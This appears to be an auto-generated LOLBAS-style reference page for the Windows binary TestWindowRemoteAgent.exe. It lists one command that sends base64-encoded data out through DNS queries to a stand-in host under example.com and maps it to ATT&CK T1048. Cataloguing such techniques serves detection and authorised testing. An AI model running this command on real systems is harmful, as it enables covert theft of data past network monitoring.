---
parsed_by: focuslocust
source: commands
type: generated
---
# TestWindowRemoteAgent Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## TestWindowRemoteAgent.exe

Tool page: [TestWindowRemoteAgent.exe](../../tools/windows/testwindowremoteagent.exe.md)

### Attackers may utilize this to exfiltrate data over DNS

```text
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

Description:

Sends DNS query for open connection to any host, enabling exfiltration over DNS

Related ATT&CK:

- [T1048](../../attack/techniques/T1048-exfiltration-over-alternative-protocol.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Testwindowremoteagent.yml` |
| Evidence | Command preserved from source parser. |
